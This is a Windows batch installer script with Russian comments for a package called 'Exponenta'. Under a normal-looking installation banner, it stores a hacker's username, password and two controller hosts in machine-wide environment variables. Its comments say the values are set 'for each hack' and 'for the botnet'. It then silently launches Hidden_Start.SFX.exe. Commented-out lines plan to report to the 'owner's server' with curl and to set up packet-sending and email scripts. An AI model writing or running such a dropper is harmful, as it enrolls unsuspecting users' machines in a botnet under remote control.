@echo off
rem
rem Коммандный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
rem
rem Файл возвращает:

setlocal enableextensions enabledelayedexpansion

Rem Установка системнмных переменных окружения

set curdir=%CD%
set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Dest_DIR=c:\Pub1

rem Проверка зависимостей системного окружения
rem
if exist %Dest_DIR% goto already_Exist

rem checknewid_E
rem if not exist <файлы манифеста зависимостей>

rem Подготовка пользовательских переменных окружения.
rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
rem Также проверяется наличие манифеста приложения или модуля. Если манифест присутствует -- ничегго не делается.
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4


echo -
echo Добро пожаловать в программу установки пакета
echo Данная программа устанавливает файлы в каталог %Dest_DIR%
echo -

rem Распаковка дистрибутива из SFX Архива в каталог %Dest_DIR%
rem Автоматическая распаковка должна быть настроена отдельно
rem Внимание! смотрите на назначение системных переменных!
rem Совет. При программировании держите как сводку этот заполненный файл

echo -
echo Распаковываем дистрибутив...
echo -
MainExponenta.SFX.exe
c:
cd %Dest_DIR%
cd Util

rem Регистрация переменных, если нужно

echo 
echo Регистрируем новые переменные окружения...
echo
rem Reg Add "!Key_Var!" /v "!Параметр!" /t REG_SZ /d "!Параметр!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "Ошибка" && goto UnSuccess
rem echo The variable is created

Reg Add "!Key!" /v Hacker_User /t REG_SZ /d "!Hacker_User!" /f
Reg Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
Reg Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
Reg Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
call reg_addtopath.bat %DestDIR%\Util

cd /d %curdir%
Hidden_Start.SFX.exe



rem Правка файлов конфигурации модуля Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem Создание резервной копии onSysLoad
rem
rem backup-sysloads
rem
rem создание списка постоянных изменений для демонов
rem echo > Packet_onload.bat
rem echo  > packet_send.bat
rem echo > packet_email.bat
rem
rem Копирование манифеста в нужное место
rem
rem
echo off
echo -
echo Installation is made with Success!
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:Bad_ID
echo General Error
echo Bad ID or missing dependence
echo 
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl

:sess_Finish
rem pause